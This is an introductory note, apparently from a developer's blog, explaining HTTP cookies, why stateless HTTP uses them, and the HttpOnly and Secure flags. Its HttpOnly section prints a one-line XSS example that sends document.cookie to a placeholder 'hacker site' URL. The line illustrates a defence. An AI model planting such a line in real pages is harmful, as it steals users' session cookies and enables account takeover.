## **🍪 HTTP Cookie?**

An **HTTP cookie** (web cookie, browser cookie) is a small piece of data that a server sends to a user's web browser. The browser may store the cookie and send it back to the same server with later requests.

You can add Set-Cookie attribute on response header to make it.

```
Set-Cookie: <cookie-name>=<cookie-value>
```

## **🍪 Why do we use Cookie?**

Using connectionless and stateless HTTP protocol, the server had to identify each client.

Typically, an HTTP cookie is used to tell if two requests come from the same browser—keeping a user logged in, for example. It remembers stateful information for the [stateless](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#http_is_stateless_but_not_sessionless) HTTP protocol.

Without storing stateful information on the browser as cookie, session, or else, the user has to log in whenever accessing pages that needs to log in.

## **🍪 HTTP Only Cookie**

Since cookie can be viewed in client side via Javascript, it is not quite safe from attacks like `XSS(Cross Site Scripting)`. If you access below URL, you're cookies will all be sent to the hacker😈

```js
location.href = "http://해커사이트/?cookies=" + document.cookie;
```

To prevent this problem, we can restrict the browser from accessing cookie, with HTTP Only Cookie. Simply add `HttpOnly` postfix.

```
Set-Cookie: yummy_cookie=choco; path=/; HttpOnly
```

## **🍪 Secure Cookie**

Cookie can also be intercepted on network. Add `Secure` postfix to enable secure cookie only sent to the server with an encrypted request over the HTTPS protocol.

```
Set-Cookie: id=a3fWa; Expires=Thu, 21 Oct 2021 07:28:00 GMT; Secure; HttpOnly
```

## **🍪 Ref**

- [https://ledgku.tistory.com/72](https://ledgku.tistory.com/72)
- [https://developer.mozilla.org/ko/docs/Web/HTTP/Cookies](https://developer.mozilla.org/ko/docs/Web/HTTP/Cookies)
- [https://nsinc.tistory.com/121](https://nsinc.tistory.com/121)
